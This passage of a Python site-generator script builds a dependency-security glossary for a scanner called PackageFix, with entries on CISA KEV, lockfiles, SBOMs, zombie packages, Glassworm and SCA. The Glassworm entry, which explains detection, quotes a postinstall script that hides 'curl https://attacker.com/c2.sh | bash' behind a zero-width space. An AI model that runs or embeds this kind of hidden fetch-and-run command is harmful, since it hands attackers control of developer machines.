        "one_line": "A list of vulnerabilities that the US government has confirmed are being actively used in real attacks right now.",
        "badge": "CISA · US Federal",
        "definition": "The CISA KEV (Known Exploited Vulnerabilities) catalog is a list maintained by the US Cybersecurity and Infrastructure Security Agency of vulnerabilities that have been confirmed to be actively exploited in real-world attacks. Unlike the full CVE database which contains tens of thousands of theoretical vulnerabilities, the KEV catalog only includes ones where exploitation has been observed in the wild.",
        "body": """
<h2>Why KEV is more useful than raw CVE counts</h2>
<p>There are over 200,000 CVEs in the NVD. The vast majority will never be exploited against most organizations. Trying to fix everything is impossible — and not necessary. The CISA KEV catalog cuts through the noise: if a CVE is on this list, it's being used in attacks right now. Fix these first.</p>
<p>US federal civilian agencies are legally required to remediate KEV entries within defined timeframes (usually 2 weeks for internet-facing systems). But the list is valuable for any organization — it's the clearest signal available for prioritization.</p>

<h2>Open source packages on CISA KEV</h2>
<p>The KEV catalog isn't just for government systems — it includes vulnerabilities in widely-used open source packages. Some notable entries relevant to developers:</p>
<ul style="padding-left:20px;margin:12px 0;color:var(--muted);font-size:12px;line-height:2">
  <li>Log4j (Log4Shell) — CVE-2021-44228</li>
  <li>Spring Framework (Spring4Shell) — CVE-2022-22965</li>
  <li>Apache Commons Text (Text4Shell) — CVE-2022-42889</li>
  <li>lodash, qs, minimist, jsonwebtoken, vm2 — all npm packages</li>
  <li>SnakeYAML, Netty, Commons Collections — Java packages</li>
</ul>

<h2>How PackageFix uses CISA KEV</h2>
<p>PackageFix checks every scanned package against the live CISA KEV catalog, which updates daily. Packages on the KEV list get a red <span class="badge badge-red">🔴 CISA KEV</span> badge and appear in the ACTIVELY EXPLOITED banner at the top of scan results — separate from the regular CVE table.</p>""",
        "faqs": [
            ("How often does the CISA KEV catalog update?", "Daily. CISA adds new entries whenever exploitation of a vulnerability is confirmed. This is why PackageFix checks the live catalog rather than a cached version — a CVE added yesterday needs to be flagged today."),
            ("Does CISA KEV only apply to US government systems?", "The remediation mandate applies to US federal civilian agencies. But the catalog itself is public and valuable for any organization. If a vulnerability is being actively exploited, it's relevant regardless of what country you're in."),
            ("Is a CISA KEV entry more serious than a CVSS 10.0?", "They measure different things. CVSS 10.0 means theoretically the worst possible vulnerability. CISA KEV means it's confirmed being exploited right now. In practice, a KEV entry with CVSS 7.5 is often more urgent than a non-KEV CVSS 9.0 — because the 7.5 is actively being used."),
            ("Where can I see the full CISA KEV catalog?", "The full catalog is at cisa.gov/known-exploited-vulnerabilities-catalog. PackageFix checks the live catalog at scan time. The /cisa-kev page on PackageFix shows the subset relevant to open source package managers.")
        ],
        "related": [
            {"url": "/cisa-kev", "title": "CISA KEV Package List", "desc": "Full exploited packages list"},
            {"url": "/kev/CVE-2021-44228", "title": "Log4Shell CVE-2021-44228", "desc": "CVSS 10.0 — Java RCE"},
            {"url": "/kev/CVE-2022-22965", "title": "Spring4Shell CVE-2022-22965", "desc": "CVSS 9.8 — Spring RCE"},
            {"url": "/glossary/cvss", "title": "CVSS Score", "desc": "How severity is measured"},
        ]
    },

    {
        "slug": "lockfile",
        "term": "Lockfile",
        "one_line": "A file that records the exact version of every dependency your project installed, so every machine gets identical results.",
        "badge": "All ecosystems",
        "definition": "A lockfile is an automatically generated file that records the exact resolved versions of every direct and transitive dependency in your project. When you run npm install for the first time, npm picks the latest compatible version of every package and writes those choices to package-lock.json. The next time anyone installs — on a different machine or in CI — npm reads the lockfile and installs those exact same versions.",
        "body": """
<h2>Why lockfiles matter for security</h2>
<p>Without a lockfile, two developers running npm install on the same project on different days might get different transitive dependency versions — because a new version of a transitive package was published between the two installs. One version might be vulnerable, the other not.</p>
<p>With a lockfile committed to your repo, everyone gets the same versions. Your CI environment and your local machine match. Dependency changes are explicit and reviewable in git diffs.</p>

<h2>Lockfiles by ecosystem</h2>
<ul style="padding-left:20px;margin:12px 0;color:var(--muted);font-size:12px;line-height:2">
  <li><strong>npm</strong> — package-lock.json</li>
  <li><strong>yarn</strong> — yarn.lock</li>
  <li><strong>Python/pip</strong> — no official lockfile from pip; use poetry.lock (Poetry) or pip freeze > requirements.txt</li>
  <li><strong>Python/Poetry</strong> — poetry.lock</li>
  <li><strong>Ruby</strong> — Gemfile.lock</li>
  <li><strong>PHP</strong> — composer.lock</li>
  <li><strong>Go</strong> — go.sum</li>
  <li><strong>Rust</strong> — Cargo.lock</li>
  <li><strong>Java/Maven</strong> — no standard lockfile; effective POM + dependency tree</li>
</ul>

<h2>Always commit your lockfile</h2>
<p>Some projects have .gitignore entries that exclude lockfiles — this is almost always a mistake. The lockfile is critical for reproducible builds and security scanning. PackageFix can scan transitive dependencies when you provide the lockfile alongside your manifest — drop both files into the scanner for the most complete vulnerability coverage.</p>""",
        "faqs": [
            ("Should I commit my lockfile to git?", "Yes, always — for applications. The lockfile ensures everyone on your team and your CI environment get identical dependency versions. Not committing it is a common mistake that leads to 'works on my machine' problems and security scanning gaps."),
            ("What's the difference between package.json and package-lock.json?", "package.json lists what you want — ranges like ^4.17.0. package-lock.json records what you actually got — the exact version that resolved, like 4.17.21. The lockfile is the source of truth for what's actually running."),
            ("Does PackageFix use the lockfile?", "Yes. Drop your lockfile alongside your manifest into PackageFix for transitive dependency scanning. Without the lockfile, PackageFix only scans direct dependencies. With it, every transitive package is checked against OSV and CISA KEV."),
            ("What happens if my lockfile and package.json are out of sync?", "npm will warn you and refuse to run npm ci. Run npm install to regenerate the lockfile, review the diff, then commit. PackageFix's /error/package-json-missing-lockfile page covers this specific error.")
        ],
        "related": [
            {"url": "/glossary/transitive-dependency", "title": "Transitive Dependency", "desc": "What lockfiles track"},
            {"url": "/fix/npm/lockfile-mismatch", "title": "Fix Lockfile Mismatch", "desc": "npm ci error fix"},
            {"url": "/error/package-json-missing-lockfile", "title": "package-lock.json Missing", "desc": "Error fix guide"},
            {"url": "/glossary/dependency-scanning", "title": "Dependency Scanning", "desc": "How to scan with lockfiles"},
        ]
    },

    {
        "slug": "sbom",
        "term": "SBOM — Software Bill of Materials",
        "one_line": "A complete list of every component in a piece of software — like a nutrition label but for code.",
        "badge": "Compliance · Supply chain",
        "definition": "An SBOM (Software Bill of Materials) is a formal, structured list of all the components, libraries, and dependencies that make up a piece of software. The idea comes from manufacturing — physical products have bills of materials listing every part. An SBOM does the same for software, making it possible to quickly identify what's inside an application and whether any component has a known vulnerability.",
        "body": """
<h2>Why SBOMs are becoming required</h2>
<p>In 2021, a US executive order on cybersecurity required software vendors selling to the federal government to provide SBOMs. The intent was to make it easier to respond to vulnerabilities like Log4Shell — instead of searching through thousands of systems to find which ones use Log4j, an SBOM lets you query a database and get the answer immediately.</p>
<p>The EU Cyber Resilience Act (2025) similarly requires SBOMs for many product categories. Even without regulatory pressure, SBOMs are becoming a standard part of enterprise software procurement — many large companies now require vendors to provide them.</p>

<h2>SBOM formats</h2>
<ul style="padding-left:20px;margin:12px 0;color:var(--muted);font-size:12px;line-height:2">
  <li><strong>CycloneDX</strong> — OWASP standard, JSON or XML, widely supported by security tools</li>
  <li><strong>SPDX</strong> — Linux Foundation standard, originally focused on license compliance, now covers security too</li>
</ul>

<h2>How to generate an SBOM from your lockfile</h2>
<pre># npm projects
npx @cyclonedx/cyclonedx-npm --output-file sbom.json

# Python
pip install cyclonedx-bom
cyclonedx-bom -o sbom.json

# Using syft (all ecosystems)
syft . -o cyclonedx-json > sbom.json</pre>

<h2>How PackageFix relates to SBOMs</h2>
<p>PackageFix isn't an SBOM generator, but it covers the security scanning part of what SBOMs are used for. If you paste your lockfile into PackageFix, it effectively does what SBOM vulnerability scanning does — checks every component against the OSV database and CISA KEV catalog. For formal SBOM generation, use CycloneDX or syft; for quick vulnerability scanning, use PackageFix.</p>""",
        "faqs": [
            ("Is an SBOM the same as a lockfile?", "They overlap but aren't the same. A lockfile records exact resolved versions for reproducible builds. An SBOM is a formal document designed for external consumption — it follows a standard format (CycloneDX, SPDX), can include license information, provenance data, and component hashes, and is meant to be shared with customers or regulators."),
            ("Do I need an SBOM if I'm not selling to the US government?", "Not legally required for most. But if you sell software to large enterprises, they increasingly request SBOMs. The EU Cyber Resilience Act will require them for many product categories. It's worth generating one even if not required — it's useful for your own incident response."),
            ("Can PackageFix generate an SBOM?", "Not yet — PackageFix is focused on vulnerability scanning and fix generation. For SBOM generation, use CycloneDX's official tools, syft, or grype. These are free and work with the same manifest files PackageFix accepts."),
            ("What's the fastest way to check if an SBOM has CVEs?", "Use osv-scanner with a CycloneDX or SPDX file: osv-scanner --sbom sbom.json. Or use PackageFix with your lockfile for a faster browser-based check without needing to generate a formal SBOM first.")
        ],
        "related": [
            {"url": "/glossary/dependency-scanning", "title": "Dependency Scanning", "desc": "How to find CVEs"},
            {"url": "/glossary/transitive-dependency", "title": "Transitive Dependencies", "desc": "What SBOMs capture"},
            {"url": "/guides/github-actions", "title": "GitHub Actions Integration", "desc": "Automate SBOM-based scanning"},
            {"url": "/cisa-kev", "title": "CISA KEV Package List", "desc": "Actively exploited packages"},
        ]
    },

    {
        "slug": "zombie-package",
        "term": "Zombie Package",
        "one_line": "A package that was dormant for months or years and then suddenly published a new version — a warning sign of a compromised maintainer account.",
        "badge": "npm · supply chain",
        "definition": "A zombie package is an informal term for an open source package that went quiet for an extended period (months to years with no updates) and then unexpectedly published a new version. This pattern is a known indicator of a compromised maintainer account — an attacker gains access, publishes a malicious update, and relies on the package's existing install base to spread the payload.",
        "body": """
<h2>Why dormancy followed by activity is suspicious</h2>
<p>Legitimate maintainers tend to follow predictable patterns — regular releases, changelogs, GitHub activity. When a package goes completely silent for over a year and then suddenly releases a new version, one of a few things is happening: the maintainer came back, the project was abandoned and then revived, or someone else now has access to the account.</p>
<p>Attackers specifically target dormant packages because they have established trust — hundreds of thousands of weekly downloads, no recent scrutiny, maintainers who may not even be monitoring the account anymore. It's a much easier target than a recently-updated popular package with active maintainers watching for unusual activity.</p>

<h2>The event-stream attack — the original zombie</h2>
<p>In 2018, the npm package event-stream had over 2 million weekly downloads. The original maintainer handed it off to a stranger who seemed trustworthy. The new maintainer added a dependency called flatmap-stream containing malicious code targeting a specific Bitcoin wallet. The attack ran undetected for 2.5 months before a developer noticed.</p>
<p>This pattern has repeated dozens of times since. The attacker doesn't even need to hack anything — they just ask to take over an abandoned package and the original maintainer says yes.</p>

<h2>How PackageFix detects zombie packages</h2>
<p>PackageFix fetches the npm registry's publish history for each package. If a package was dormant for more than 24 months and published a new version within the last 72 hours with more than 100,000 weekly downloads, it gets flagged with a <span class="badge badge-orange">🧟 ZOMBIE</span> badge: "Updated 4 hours ago after 18 months of inactivity — may indicate compromised maintainer account."</p>""",
        "faqs": [
            ("Should I avoid all packages that haven't been updated recently?", "Not necessarily — some packages are just stable and don't need updates. The concern is specifically the combination of long dormancy followed by a sudden update, especially in packages with large install bases. A package that hasn't been updated in 2 years and isn't about to be updated is lower risk than one that just got its first update in 2 years."),
            ("Is there a registry-level protection against zombie package attacks?", "npm and PyPI have implemented some protections — 2FA requirements for popular packages, email alerts on publishes. But they can't prevent all cases. A legitimate maintainer account that gets phished isn't something a registry can automatically detect."),
            ("What should I do if PackageFix flags a zombie package?", "Don't upgrade to the new version until you've reviewed the changes. Check the package's GitHub repo for the release notes, review the actual code diff, and look for discussion in the issues. If the new version adds new dependencies, network calls, or shell commands, be very cautious."),
            ("Does this only apply to npm?", "PackageFix checks dormancy patterns for npm, PyPI, and RubyGems. The same attack pattern applies to all ecosystems — any package registry where accounts can be compromised or handed off is potentially affected.")
        ],
        "related": [
            {"url": "/glossary/supply-chain-attack", "title": "Supply Chain Attack", "desc": "The broader attack category"},
            {"url": "/blog/supply-chain-attacks-package-json", "title": "5 Supply Chain Attacks", "desc": "npm audit misses these"},
            {"url": "/glossary/dependency-scanning", "title": "Dependency Scanning", "desc": "How to detect these"},
            {"url": "/npm", "title": "npm Security Guide", "desc": "All npm vulnerability guides"},
        ]
    },

    {
        "slug": "glassworm",
        "term": "Glassworm",
        "one_line": "A supply chain attack technique that hides malicious code inside invisible Unicode characters in package scripts.",
        "badge": "npm · supply chain · 2026",
        "definition": "Glassworm is a supply chain attack technique where malicious code is embedded inside invisible Unicode characters — zero-width spaces, variation selectors, and other non-printing characters — within package.json scripts or source files. The code looks completely normal in text editors and code review, but the shell executes the full string including the hidden payload.",
        "body": """
<h2>How it works</h2>
<p>JavaScript and most terminals treat zero-width Unicode characters (like U+200B, the zero-width space) as invisible — they don't render and don't affect text appearance. But the shell sees them. An attacker can embed an entire command after an invisible character, making a benign-looking script actually execute additional malicious code.</p>

<h2>What it looks like</h2>
<p>What you see in your editor:</p>
<pre>"postinstall": "node setup.js"</pre>

<p>What's actually in the file (revealed in a hex editor):</p>
<pre>"postinstall": "node\u200B setup.js && curl https://attacker.com/c2.sh | bash"</pre>

<p>The zero-width space (U+200B) is invisible. The <code>&amp;&amp;</code> and everything after it runs silently on install.</p>

<h2>The 2026 Glassworm campaign</h2>
<p>In March 2026, security researchers identified the Glassworm campaign — a coordinated attack using this technique against npm packages targeting developer workstations. Affected packages installed a multi-stage RAT (Remote Access Trojan) that force-installed a malicious Chrome extension to log keystrokes and steal session cookies.</p>
<p>The campaign was notable because standard security tools — npm audit, Dependabot, even most static analysis tools — had no detection for invisible Unicode in scripts.</p>

<h2>How to detect Glassworm</h2>
<p>PackageFix scans every field in your manifest for non-printable Unicode characters before running any vulnerability checks. If invisible characters are found, you get an immediate red banner: "Invisible Unicode characters detected in this manifest — do not use it." The scan stops and the manifest is flagged as potentially compromised.</p>
<p>You can also check manually in your terminal:</p>
<pre>cat -A package.json | grep -P '[\x00-\x08\x0b-\x1f\x7f]'</pre>""",
        "faqs": [
            ("Which Unicode characters does Glassworm use?", "The most commonly used are: U+200B (zero-width space), U+200C (zero-width non-joiner), U+200D (zero-width joiner), U+FEFF (zero-width no-break space / BOM), and U+FE00-U+FE0F (variation selectors). All are invisible in most text editors and terminals."),
            ("Does GitHub's code review catch Glassworm?", "GitHub's UI doesn't render these characters — they're invisible there too. Some GitHub security features can flag unusual characters, but code review alone is not reliable protection. Automated scanning is required."),
            ("Is Glassworm only an npm problem?", "The technique applies to any ecosystem that runs scripts during install — npm's postinstall, Python's setup.py, Ruby's gemspec native extensions. npm is the most common target because postinstall scripts run automatically on npm install with no confirmation."),
            ("How is Glassworm different from obfuscated code?", "Obfuscated code is visible but hard to read — it's there, just confusing. Glassworm code is literally invisible — it renders as nothing but executes as real commands. Standard code review and most static analysis tools scan what they can see, not what's hidden in invisible Unicode.")
        ],
        "related": [
            {"url": "/glossary/supply-chain-attack", "title": "Supply Chain Attack", "desc": "The broader attack category"},
            {"url": "/blog/supply-chain-attacks-package-json", "title": "5 Supply Chain Attacks", "desc": "Includes Glassworm detection"},
            {"url": "/glossary/zombie-package", "title": "Zombie Package", "desc": "Another hidden attack"},
            {"url": "/npm", "title": "npm Security Guide", "desc": "All npm vulnerability guides"},
        ]
    },

    {
        "slug": "dependency-scanning",
        "term": "Dependency Scanning",
        "one_line": "Automatically checking your project's dependencies for known vulnerabilities and security risks.",
        "badge": "SCA · DevSecOps",
        "definition": "Dependency scanning (also called Software Composition Analysis or SCA) is the process of automatically checking every package your project uses against databases of known vulnerabilities. Given that a typical application has hundreds of dependencies, manual checking is impractical — dependency scanning tools automate this and flag packages with known CVEs.",
        "body": """
<h2>What dependency scanning checks</h2>
<p>Basic dependency scanning checks your package versions against CVE databases. More advanced tools also check for:</p>
<ul style="padding-left:20px;margin:12px 0;color:var(--muted);font-size:12px;line-height:2">
  <li><strong>CISA KEV status</strong> — is this CVE actively being exploited?</li>
  <li><strong>Transitive dependencies</strong> — vulnerabilities in packages your dependencies use</li>
  <li><strong>Supply chain risks</strong> — typosquatting, zombie packages, malicious scripts</li>
  <li><strong>License compliance</strong> — GPL packages that might affect your license</li>
  <li><strong>Deprecation</strong> — packages that are no longer maintained</li>
</ul>

<h2>When to scan</h2>
<p>The answer is: always. The three most useful integration points are:</p>
<ul style="padding-left:20px;margin:12px 0;color:var(--muted);font-size:12px;line-height:2">
  <li><strong>In CI/CD</strong> — block deploys if critical CVEs are found (see <a href="/guides/github-actions">GitHub Actions guide</a>)</li>
  <li><strong>In pre-commit hooks</strong> — catch vulnerabilities before they enter your git history (see <a href="/guides/pre-commit">pre-commit guide</a>)</li>
  <li><strong>Manually</strong> — before adding a new dependency, paste its manifest into PackageFix and check its CVE history</li>
</ul>

<h2>How PackageFix fits in</h2>
<p>PackageFix is a manual, browser-based dependency scanner — paste your manifest, get results immediately. It's complementary to automated tools like Dependabot (which opens PRs automatically) or OSV Scanner (which runs in CI). Use PackageFix when you need a quick one-off check, want to see the CISA KEV status, or need a downloadable fixed manifest rather than just a report.</p>""",
        "faqs": [
            ("What's the difference between dependency scanning and SAST?", "SAST (Static Application Security Testing) analyzes your own code for vulnerabilities — SQL injection, XSS, insecure cryptography. Dependency scanning checks the third-party packages you use. Both are important and complementary. SAST doesn't check dependencies; dependency scanning doesn't check your own code."),
            ("Is npm audit dependency scanning?", "Yes — npm audit is a basic dependency scanner built into npm. It checks your packages against the npm security advisory database. More comprehensive tools like PackageFix add CISA KEV flags, supply chain detection, transitive scanning, and fix output."),
            ("How often should I run dependency scans?", "Automated scanning should run on every pull request and every deployment. Manual scans with a tool like PackageFix are useful when evaluating a new dependency, after a security incident, or before a major release."),
            ("What should I do with scan results?", "Fix Critical CVEs and CISA KEV entries immediately. Schedule High CVEs for your next sprint. Medium and Low CVEs can go in the backlog. Most importantly — don't just acknowledge and ignore. Unaddressed CVEs that later get exploited are a much worse outcome than the time it takes to update a package version.")
        ],
        "related": [
            {"url": "/glossary/sbom", "title": "SBOM", "desc": "Formal component inventory"},
            {"url": "/glossary/transitive-dependency", "title": "Transitive Dependencies", "desc": "What scanning finds"},
            {"url": "/guides/github-actions", "title": "GitHub Actions Scanning", "desc": "Automate in CI"},
            {"url": "/guides/pre-commit", "title": "Pre-commit Hooks", "desc": "Scan before each commit"},
        ]
    },

    {
        "slug": "software-composition-analysis",
        "term": "Software Composition Analysis (SCA)",
        "one_line": "The category of tools that identify and assess the open source components in your software.",
        "badge": "Enterprise · DevSecOps",
        "definition": "Software Composition Analysis (SCA) is the category name for tools that automatically identify all open source and third-party components in a codebase and assess their security, license compliance, and maintenance status. SCA tools scan your dependencies, map them to vulnerability databases, and report on risk. PackageFix is an SCA tool.",
        "body": """
<h2>What SCA tools typically do</h2>
<ul style="padding-left:20px;margin:12px 0;color:var(--muted);font-size:12px;line-height:2">
  <li>Identify all open source components (direct and transitive)</li>
  <li>Map components to known vulnerabilities (CVEs, OSV, GHSA)</li>
  <li>Report CVSS severity scores</li>
  <li>Flag licenses that may conflict with your project's license</li>
  <li>Generate SBOMs (Software Bills of Materials)</li>
  <li>Integrate with CI/CD to block deploys on critical findings</li>
</ul>

<h2>SCA vs SAST vs DAST</h2>
<p>These three categories together form the foundation of application security testing:</p>
<ul style="padding-left:20px;margin:12px 0;color:var(--muted);font-size:12px;line-height:2">
  <li><strong>SCA</strong> — checks what you use (open source components)</li>
  <li><strong>SAST (Static Analysis)</strong> — checks what you write (your source code, statically)</li>
  <li><strong>DAST (Dynamic Analysis)</strong> — checks how your app behaves when running (runtime testing)</li>
</ul>

<h2>The SCA tool landscape</h2>
<p>SCA tools range from free CLI tools to enterprise platforms:</p>
<ul style="padding-left:20px;margin:12px 0;color:var(--muted);font-size:12px;line-height:2">
  <li><strong>Free / CLI</strong> — npm audit, pip-audit, OSV Scanner, bundle-audit</li>
  <li><strong>Free / browser</strong> — PackageFix (also generates fixed manifests)</li>
  <li><strong>Automated / GitHub</strong> — Dependabot, GitHub Dependency Review</li>
  <li><strong>Paid / enterprise</strong> — Snyk, Mend, Black Duck, Sonatype Nexus IQ</li>
</ul>
<p>The right choice depends on your needs. For individual developers and small teams, free tools cover most cases. PackageFix fills the gap between "run npm audit in CLI" and "pay for an enterprise SCA platform" — browser-based, no account, with fix output.</p>""",
        "faqs": [
            ("Is PackageFix an SCA tool?", "Yes — PackageFix is a browser-based SCA tool. It identifies open source components in your manifest, maps them to vulnerabilities (OSV database + CISA KEV), and generates a fixed manifest. The main differentiator is that it's browser-based with no account required, and it outputs the fixed file rather than just reporting."),
            ("Do I need an enterprise SCA tool or will free tools work?", "For most small teams and individual developers, free tools (npm audit, pip-audit, PackageFix, OSV Scanner) cover the essentials. Enterprise SCA tools add value at scale — when you're managing hundreds of projects, need audit trails, or require integration with ticketing systems. Start free and upgrade when you outgrow it."),
            ("What's the difference between Snyk and PackageFix?", "Snyk requires GitHub integration and an account. PackageFix requires neither — paste a manifest file, get results. Snyk is automated (monitors continuously); PackageFix is manual (you run it when you want). Snyk is more comprehensive for teams; PackageFix is faster for one-off checks. See the full comparison at /vs/snyk-advisor."),
            ("How does SCA relate to SBOM compliance?", "Generating an SBOM is essentially running an SCA scan and outputting the results in a standardized format (CycloneDX or SPDX). SCA is the process; SBOM is one of the outputs. Most enterprise SCA tools can generate SBOMs directly.")
        ],
        "related": [
            {"url": "/glossary/dependency-scanning", "title": "Dependency Scanning", "desc": "The same concept, different name"},
            {"url": "/glossary/sbom", "title": "SBOM", "desc": "SCA output format"},
            {"url": "/vs/snyk-advisor", "title": "PackageFix vs Snyk", "desc": "Full comparison"},
            {"url": "/alternatives", "title": "All Alternatives", "desc": "Complete SCA tool comparison"},
        ]
    },

    {
        "slug": "open-source-vulnerability",
        "term": "Open Source Vulnerability",
        "one_line": "A security flaw in a publicly available software library that anyone using that library inherits.",
        "badge": "OSV · All ecosystems",
        "definition": "An open source vulnerability is a security flaw in a publicly available software package — an npm module, a Python library, a Ruby gem, a Java artifact. Because open source code is shared and reused across thousands of applications, a single vulnerability in one package can affect millions of software systems simultaneously.",
        "body": """
<h2>Why open source vulnerabilities spread so far</h2>
<p>A vulnerability in a popular package like lodash (which has over 50 million weekly downloads) isn't a problem affecting one company. It's a problem affecting everyone who uses lodash — which includes the majority of Node.js applications in production. When a CVE is filed against lodash, the security industry has to simultaneously notify and help patch millions of deployments.</p>
<p>This is fundamentally different from a vulnerability in proprietary code, which only affects the specific system where that code runs.</p>

<h2>The OSV database</h2>
<p>The Open Source Vulnerability (OSV) database, run by Google, is the most comprehensive and up-to-date source of open source vulnerability information. Unlike the NVD (which can lag by weeks), OSV updates in near real-time and maps vulnerabilities directly to specific affected package versions — making it ideal for automated scanning tools. PackageFix uses the OSV API for all its vulnerability checks.</p>

<h2>How open source vulnerabilities get found</h2>
<ul style="padding-left:20px;margin:12px 0;color:var(--muted);font-size:12px;line-height:2">
  <li><strong>Security researchers</strong> — individuals or firms auditing popular packages</li>
  <li><strong>Fuzzing</strong> — automated tools that send random inputs looking for crashes</li>
  <li><strong>Bug bounty programs</strong> — paid incentives for responsible disclosure</li>
  <li><strong>User discovery</strong> — developers who notice unexpected behavior and investigate</li>
  <li><strong>AI-assisted analysis</strong> — increasingly, LLMs reviewing code for security patterns</li>
</ul>
<p>Once discovered, the responsible disclosure process involves notifying the maintainer, giving them time to patch, then publishing the CVE. The window between patch and public disclosure is when the most damage can happen — users who haven't updated are vulnerable and don't know it yet.</p>""",
        "faqs": [
            ("How quickly should I patch an open source vulnerability?", "Depends on severity and exploitation status. Critical CVEs on the CISA KEV list: patch immediately — same day if possible. High CVEs: this sprint. Medium CVEs: next scheduled update. Low CVEs: backlog. The hard part is finding out which vulnerabilities affect your specific versions — that's what PackageFix automates."),
            ("Is using open source software riskier than proprietary software?", "Not inherently — open source vulnerabilities are more visible because the code is public, but that visibility also means faster discovery and patching. Proprietary software has vulnerabilities too; you just often don't know about them. The transparency of open source, combined with good scanning tools, makes it manageable."),
            ("What is responsible disclosure?", "Responsible disclosure is the practice of privately notifying a maintainer about a vulnerability, giving them time to release a patch, and only then making the vulnerability public. This reduces the window where attackers can exploit a known vulnerability before a fix is available."),
            ("Where does PackageFix get its vulnerability data?", "PackageFix queries the OSV API (api.osv.dev) for vulnerability data and cross-references with the CISA KEV catalog. OSV aggregates data from GitHub Advisory Database, NVD, RustSec, PyPI advisories, and many other sources — making it one of the most comprehensive open source vulnerability feeds available.")
        ],
        "related": [
            {"url": "/glossary/cve", "title": "CVE", "desc": "How vulnerabilities are identified"},
            {"url": "/glossary/dependency-scanning", "title": "Dependency Scanning", "desc": "How to find them"},
            {"url": "/cisa-kev", "title": "CISA KEV Packages", "desc": "Actively exploited right now"},
            {"url": "/glossary/sbom", "title": "SBOM", "desc": "Inventorying your open source"},
        ]
    },

]

# ══════════════════════════════════════════════════════════════════════════════
# GENERATE GLOSSARY TERM PAGES
# ══════════════════════════════════════════════════════════════════════════════

print("\n📖 Generating glossary term pages...")
for term_data in TERMS:
    slug = term_data["slug"]
    term = term_data["term"]
    one_line = term_data["one_line"]
    definition = term_data["definition"]
    badge = term_data["badge"]
    body_extra = term_data["body"]
    faqs = term_data["faqs"]
    related = term_data["related"]

    body = f"""
<h1>{term}</h1>
<div style="margin-bottom:24px"><span class="badge badge-purple">{badge}</span></div>

<div class="definition-box">
  <div class="def-label">Definition</div>
  <p class="lead">{definition}</p>
</div>

{body_extra}

{cta()}
{faq_section(faqs)}
{related_section(related)}
"""

    schemas = glossary_schemas(term, definition, slug, faqs)
    page_title = f"{term} — Definition | PackageFix Glossary"
    page_desc = f"{one_line} {definition[:100]}..."

    html = shell(
        page_title,
        page_desc,
        f"/glossary/{slug}",
        [("PackageFix", "/"), ("Glossary", "/glossary"), (term, None)],
        body,
        schemas
    )
    write(f"glossary/{slug}", html)


# ══════════════════════════════════════════════════════════════════════════════
# GLOSSARY INDEX PAGE
# ══════════════════════════════════════════════════════════════════════════════

print("\n📚 Generating glossary index...")

index_cards = "".join(
    f"""<div class="glossary-card">
  <a href="/glossary/{t['slug']}">{t['term']}</a>
  <p>{t['one_line']}</p>
</div>"""
    for t in TERMS
)

index_body = f"""
<h1>Dependency Security Glossary</h1>
<p class="lead" style="margin-bottom:32px">Plain-English definitions of dependency security terms — CVEs, supply chain attacks, scanning tools, and everything in between.</p>

<div class="glossary-index">
{index_cards}
</div>

<div style="margin:48px 0">
  <h2>Start here</h2>
  <div class="related-grid">
    <div class="related-card"><a href="/glossary/supply-chain-attack">Supply Chain Attack</a><p>The most important concept to understand</p></div>
    <div class="related-card"><a href="/glossary/cisa-kev">CISA KEV</a><p>How to prioritize which CVEs to fix first</p></div>
    <div class="related-card"><a href="/glossary/transitive-dependency">Transitive Dependency</a><p>Why you have 900 packages when you wrote 20</p></div>
    <div class="related-card"><a href="/glossary/lockfile">Lockfile</a><p>The most underappreciated security file in your repo</p></div>
  </div>
</div>
"""

index_schemas = [
    {
        "@type": "DefinedTermSet",
        "name": "PackageFix Dependency Security Glossary",
        "description": "Plain-English definitions of dependency security terms — CVEs, supply chain attacks, scanning tools, lockfiles, SBOMs, and more.",
        "url": BASE_URL + "/glossary",
        "hasDefinedTerm": [
            {"@type": "DefinedTerm", "name": t["term"], "url": BASE_URL + f"/glossary/{t['slug']}"}
            for t in TERMS
        ]
    },
    {
        "@type": "BreadcrumbList",
        "itemListElement": [
            {"@type": "ListItem", "position": 1, "name": "PackageFix", "item": BASE_URL},
            {"@type": "ListItem", "position": 2, "name": "Glossary", "item": BASE_URL + "/glossary"}
        ]
    }
]

write("glossary", shell(
    "Dependency Security Glossary — Plain-English Definitions | PackageFix",
    "Plain-English definitions of dependency security terms: CVEs, CVSS, CISA KEV, supply chain attacks, prototype pollution, typosquatting, SBOMs, lockfiles, and more.",
    "/glossary",
    [("PackageFix", "/"), ("Glossary", None)],
    index_body,
    index_schemas
))


# ══════════════════════════════════════════════════════════════════════════════
# UPDATE CONFIG FILES
# ══════════════════════════════════════════════════════════════════════════════

print("\n📝 Updating vercel.json...")
rewrites = []
for p in all_paths:
    rewrites.append({"source": p, "destination": f"/seo{p}/index.html"})
    rewrites.append({"source": p + "/", "destination": f"/seo{p}/index.html"})

vercel_config = {}
if os.path.exists("vercel.json"):
    with open("vercel.json") as f:
        vercel_config = json.load(f)

existing = vercel_config.get("rewrites", [])
existing_sources = {r["source"] for r in existing}
for r in rewrites:
    if r["source"] not in existing_sources:
        existing.append(r)
        existing_sources.add(r["source"])

vercel_config["rewrites"] = existing
with open("vercel.json", "w") as f:
    json.dump(vercel_config, f, indent=2)
print(f"  ✓ vercel.json — {len(existing)} total rewrites")

print("\n🗺 Updating sitemap-seo.xml...")
new_urls = ""
for p in all_paths:
    priority = "0.9" if p == "/glossary" else "0.8"
    new_urls += f"""  <url>
    <loc>{BASE_URL}{p}</loc>
    <changefreq>monthly</changefreq>
    <priority>{priority}</priority>
  </url>\n"""

if os.path.exists("sitemap-seo.xml"):
    with open("sitemap-seo.xml") as f:
        content = f.read()
    updated = content.replace("</urlset>", new_urls + "</urlset>")
else:
    updated = '<?xml version="1.0" encoding="UTF-8"?>\n<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n' + new_urls + "</urlset>"
with open("sitemap-seo.xml", "w") as f:
    f.write(updated)
print(f"  ✓ sitemap-seo.xml — {len(all_paths)} new URLs")

print("\n🤖 Updating llm.txt...")
with open("llm.txt", "a") as f:
    f.write("\n## Glossary Pages\n")
    for p in all_paths:
        f.write(f"{BASE_URL}{p}\n")
print("  ✓ llm.txt updated")

print(f"\n✅ Done — {len(all_paths)} glossary pages")
for p in all_paths:
    print(f"   {p}")
